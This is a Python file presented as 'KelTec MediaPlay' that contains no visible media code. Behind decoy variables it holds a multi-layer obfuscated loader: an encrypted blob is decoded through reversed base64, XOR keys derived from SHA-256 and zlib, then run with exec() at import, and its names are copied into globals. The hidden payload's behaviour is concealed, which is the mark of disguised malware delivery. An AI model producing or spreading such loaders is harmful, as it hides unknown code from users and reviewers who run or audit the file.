# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 205026 ^ 974048
_lx1_1 = len("b45c6d")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-746125)
_lx3_3 = 761901 * 0
_lx4_4 = 244220 ^ 135820
_K = '4cccd6b080db1537e3df33747f236cf93848358e5d3d38505b14a531282d3d04'
_M = 'rDQmkZMr7MzGqFZd3Ygv3sRhDvFsKlMGRB/vWyrBEVK1amzN1iDrhpiqWl2O233YkW0P9ml3UgUaT+1dfsZJVuBoPsmCIu/TmKwO'
_D = 'he2DK57M9R2Lu3r+HfFDVP4aXEepXPI7gfg3REms2P8iXQuPzpHw7teieNKW5xm6OZSum2LXIQVhWXjI/meRRxQmwkR2FyTBX7LPB0c7uV7G3ri777dadksVBm4mQGnIFCAKjRW33KTyg2AUZOTigA+YXrUWQ5h2eurOiR+t/FPiAKVDOH5wIjVr83lxGNJ0/9nWi1CnHAF56Mbbp9+nuhOjJBkimmfPcdABdeggO8TGyvMpNGpogEvwIdW1T0sVtrkx/Ps4p0BD31zjxDQKkiNjqis8ZaOzZqy9ofTwLvdopTMlveLBB0UfGKAJknXgEHIjCDwEwg1AIqI22TLnsCsGHxSded/K5m/gUJAFBtWB3CHuiK2fXTRv3uWBe4BiIJrNWp7eP/P1XCG2Xlx2BsA3SWioSfLUBKV0P19eEHTS07VVAbPDcjxnT2pgUFVW6LBpftoYkw8eyoBiJXHNqXluukJPHnpm4sL0ddI6VeaiOUoyOIrO2WdypcKpyNpi39ValvzREEhi4tj95pBTnLfxkBAO+AOVXIvzh7eoq/VC/VcFOOG++zBsiPlRs9vbyae3jCLOFK1HhmPMYzNJkJIGM4D2FfU57VEaeFqSx1ydZygOODDg0iNDcoXi8e1UIc/Y0FHkGeuocsyzJx9ph3BgMblQaMy22aSXC4uMf6QG2aImyvvF+XrncxKntuxMDiV1HmKr5/8Rr9YEw1tVrduf3pWU8L2hMzA8EL+yphlgAw3P7gmYZZ33tsubQENtvM8dSgCtqYEU3m29cVEa9RZiKO3rwdLEJqdwUXP4V9R/vtK9L6kOZVtgwA0xmM8YY1hpjgNZ9i7+89zjE1InpmfC/qhn20LNuoMcB5u4dtq7xxuZuyxvI1Pp3n4b0ivbF8bmJDekXpsmpMvdq8LhUbet6ujWEWHWkFim3r6OpXdXKhK1udUkFoaqvO+MPFlGBkS+mD7jshyPZPR4/HG+ugNp2M2aMBqx1w2ExBExcJL5VvUF9NPWTY8dzsB2pBNMukTNLvDU8s/AK9pVBl3enoEIMSZ6imiFPiWPVikU/NDrmZ/8MFTyN01S23Gjdmkrlyh/0CYlav4qetg4V1DnTD5CP6p7cKUDEYDypoFct9J9jyKGX80hyZ5mCwrM1QraTbBLv/7MKFVkrjOqQfkrqL3B6KWbzNQzxyc7pX9jMbax45xlDnIkuDmHld4yFQwLxn+GWG+MheaPGEHdkX69Fc4MLOc8RgqvY+SKNWLe334B6jfi7rkQaqZTRYu5jFdhx8t/ZNyj2jJn+cue3/myiLAZTjsqJ0svJY6jBmxl5KDsxFg0HIHtxL1miNtkIf8yB0VHSdbZ0elmihfiVDZFvMW8WeGGv5KxJesjvUGFxcWG6reFETwUEIF9BE50qh2kw7WlE/h9OYLK4oP1xwZgs6MGlxnTXQjFL1lH6zirqa9pL8dQNShq9KATR7EXTtL5WGsExSOy+V3JagKuPLMPOBQkDrUqHsxPI4gbpAJRxvEHnc+am9sWUIjLj7AjViFQxY6d1VslSW65cY1PoYvVbOycrXrcLucEQx8DZt2sGE6UmEGb1SdKVScmLsmgB+0DCSAgyC/vyibz7yWPPRTRgW1IyGJjPByCMUdlPIRU9lUPCqLHoN+btaYzaafJEy2fPAmu7X3+YDaa+dgueDGKhkth8B+PiTd1zUrI5ZcYNvnTp42eqra2RtceGAU3w1KaR0YfUQhLkXBWuJ3zKF7Rtz9ULu7SJ0baPtw4u3tBiqblHVbDuURpjLknERWwZQpmOJvZYhkQv4qMpg10ntbitIgSQOnY4fUURTbNuQ+LugfLX9DbFPqEL11ocmoZVVkj'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})